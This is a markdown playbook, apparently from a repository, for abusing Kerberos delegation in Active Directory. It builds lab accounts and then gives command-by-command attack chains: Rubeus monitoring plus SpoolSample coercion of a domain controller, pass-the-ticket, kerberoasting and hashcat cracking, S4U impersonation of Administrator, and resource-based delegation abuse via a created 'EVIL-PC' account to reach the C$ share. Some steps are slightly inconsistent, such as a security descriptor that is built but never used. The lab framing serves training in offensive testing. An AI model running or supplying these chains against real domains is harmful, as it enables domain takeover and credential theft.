# Kerberos Delegation Abuse Playbook

---

## 1. Unconstrained Delegation Abuse

### 1.1 Enumeration

```powershell
Get-DomainComputer -Unconstrained
Get-DomainUser -Unconstrained

```

## 2. Create Labaratory

### 2.1 Laboratory setup

<img width="577" height="671" alt="image" src="https://github.com/user-attachments/assets/e7beee5c-0142-4f88-8b8d-dd7ae806a78d" />

---

```powershell
Do not trust this computer for delegation                         - Dont Have Delegation
Trust this computer for delegation to any service (Kerberos only) - Unconstrained Delegation
Trust this computer for delegation to specified services only     - Constrained Delegation

Use Kerberos only:
Use any authentication protocol
Resource-Based Constrained Delegation (RBCD)
```

# 2.2 Unconstrained Delegation
```powershell
Import-Module ActiveDirectory

# Create Computer Account
New-ADComputer -Name "UNCON-PC" -SAMAccountName "UNCON-PC" -Enabled $true

# Enable unconstrained delegation (TRUSTED_FOR_DELEGATION flag)
Set-ADAccountControl -Identity "UNCON-PC$" -TrustedForDelegation $true

# Check
Get-ADComputer -Identity "UNCON-PC" -Properties TrustedForDelegation, userAccountControl
```
<img width="642" height="215" alt="image" src="https://github.com/user-attachments/assets/fff47efd-260f-4739-b802-b2551249bbbe" />

---
```powershell
Import-Module PowerView.ps1



.\Rubeus.exe monitor /interval:5 /filteruser:DOMAIN_ADMIN_NAME

.\SpoolSample.exe DC01 UNCON-PC

.\Rubeus.exe ptt /ticket:base64_ticket_burada
```

---
# 2.3 Constrained Delegation with Protocol Transition (S4U2Self + S4U2Proxy)
```powershell
Import-Module ActiveDirectory

# Create Service Account
New-ADUser -Name "unconstrained-svc" -SAMAccountName "unconstrained-svc" `
    -AccountPassword (ConvertTo-SecureString "sako2005!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true

# Set SPN
setspn -A HTTP/unconstrained-svc.warzone.oxsium.local unconstrained-svc

# Enable Constrained Delegation + Protocol Transition
Set-ADAccountControl -Identity "unconstrained-svc" -TrustedToAuthForDelegation $true
Set-ADUser -Identity "unconstrained-svc" -Add @{
    'msDS-AllowedToDelegateTo' = @("CIFS/WIN-WARZONE.warzone.oxsium.local","HTTP/WIN-WARZONE.warzone.oxsium.local")
}

# Check
Get-ADUser -Identity "unconstrained-svc" -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo, ServicePrincipalName
```

```powershell
Import-Module .\PowerView.ps1

# Find SPN-enabled accounts with PowerView
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Direct kerberoast with Rubeus
.\Rubeus.exe kerberoast /user:unconstrained-svc /outfile:hashes.txt

# Crack Hash
hashcat -m 13100 hashes.txt rockyou.txt

# Convert password to NTLM Hash
.\Rubeus.exe hash /password:sako2005! /user:unconstrained-svc /domain:warzone.oxsium.local

# The complete chain with Rubeus
.\Rubeus.exe s4u /user:unconstrained-svc /rc4:BURAYA_RC4_HASH `
    /impersonateuser:Administrator `
    /msdsspn:CIFS/WIN-WARZONE.warzone.oxsium.local `
    /ptt
```

# 2.4 Constrained Delegation without Protocol Transition ( Use Kerberos only )
```powershell
Import-Module ActiveDirectory

# Create Service Account
New-ADUser -Name "constrained-svc" -SAMAccountName "constrained-svc" `
    -AccountPassword (ConvertTo-SecureString "sako2005!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true

# Set SPN
setspn -A HTTP/constrained-svc.warzone.oxsium.local constrained-svc

# Constrained delegation, BUT WITHOUT PROTOCOL TRANSITION
# (TrustedToAuthForDelegation is not set - default remains False)
Set-ADUser -Identity "constrained-svc" -Add @{
    'msDS-AllowedToDelegateTo' = @("CIFS/WIN-WARZONE.warzone.oxsium.local","HTTP/WIN-WARZONE.warzone.oxsium.local")
}

# Check - TrustedToAuthForDelegation must be False
Get-ADUser -Identity "constrained-svc" -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo, ServicePrincipalName
```

# 2.5 Resource-Based Constrained Delegation (RBCD)
```powershell
Import-Module ActiveDirectory

# Create target computer account - NO delegation is enabled (default)
New-ADComputer -Name "RBCD-PC" -SAMAccountName "RBCD-PC" -Enabled $true

# Check - TrustedForDelegation False, msDS-AllowedToActOnBehalfOfOtherIdentity empty
Get-ADComputer -Identity "RBCD-PC" -Properties TrustedForDelegation, msDS-AllowedToActOnBehalfOfOtherIdentity
```
```powershell
# With PowerView (in a lowpriv-user context)
$ComputerName = "EVIL-PC"
$Password = ConvertTo-SecureString "Ev1lP@ss123!" -AsPlainText -Force
New-ADComputer -Name $ComputerName -SAMAccountName "$ComputerName$" `
    -AccountPassword $Password -Enabled $true `
    -Path "CN=Computers,DC=warzone,DC=oxsium,DC=local"

$evilSID = Convert-NameToSid EVIL-PC$

$SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$evilSID)"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes, 0)

Set-ADComputer -Identity "RBCD-PC" -PrincipalsAllowedToDelegateToAccount "EVIL-PC$"

# Check
Get-ADComputer -Identity "RBCD-PC" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# Full chain with Rubeus
.\Rubeus.exe s4u /user:EVIL-PC$ /password:Ev1lP@ss123! `
    /impersonateuser:Administrator `
    /msdsspn:CIFS/RBCD-PC.warzone.oxsium.local `
    /domain:warzone.oxsium.local `
    /ptt

ls \\RBCD-PC.warzone.oxsium.local\C$
```
